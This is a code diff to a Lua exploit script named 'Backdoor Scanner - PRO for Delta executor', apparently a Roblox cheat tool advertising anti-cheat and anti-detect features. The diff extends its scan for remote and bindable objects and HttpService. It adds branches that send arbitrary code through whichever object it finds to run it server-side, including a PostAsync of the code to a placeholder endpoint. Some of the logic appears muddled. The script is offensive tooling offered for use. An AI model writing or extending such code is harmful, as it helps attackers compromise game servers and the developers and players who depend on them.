@@ -1,5 +1,5 @@
 -- Backdoor Scanner - PRO for Delta executor (Ultimate Edition)
--- Features: Ultra-Advanced Backdoor scanning, Super-Modern Animated UI, Anti-Cheat, Anti-Detect, Extended Logging, Smooth Animations, Server-Side Require Execution, Draggable UI, Real-Time Log Viewer, RemoteStorage Integration, RemoteEvent, RemoteFunction, and More.
+-- Features: Ultra-Advanced Backdoor scanning, Super-Modern Animated UI, Anti-Cheat, Anti-Detect, Extended Logging, Smooth Animations, Server-Side Require Execution, Draggable UI, Real-Time Log Viewer, RemoteStorage Integration, RemoteEvent, RemoteFunction, HTTP Requests, and More.
 
 local scanner = {}
 
@@ -17,7 +17,7 @@ end
 -- Optimized Backdoor Scan Function with Coroutine
 local function scanForBackdoors()
     local backdoors = {}
-    local methods = {"RemoteEvent", "RemoteFunction"}
+    local methods = {"RemoteEvent", "RemoteFunction", "BindableFunction", "BindableEvent", "HttpService"}
     
     for _, obj in pairs(game:GetDescendants()) do
         if #backdoors % 100 == 0 then wait() end
@@ -47,8 +47,16 @@ local function executeServerRequire(scriptID)
                 elseif backdoor:IsA("RemoteEvent") then
                     backdoor:FireServer(code)
                     return "[SUCCESS] Fired RemoteEvent"
+                elseif backdoor:IsA("BindableFunction") then
+                    return backdoor:Invoke(code)
+                elseif backdoor:IsA("BindableEvent") then
+                    backdoor:Fire(code)
+                    return "[SUCCESS] Fired BindableEvent"
+                elseif backdoor:IsA("HttpService") then
+                    backdoor:PostAsync("https://your-endpoint.com/execute", code)
+                    return "[SUCCESS] Sent HTTP request"
                 else
-                    error("[ERROR] No suitable RemoteFunction or RemoteEvent found")
+                    error("[ERROR] No suitable backdoor method found")
                 end
             end)
             
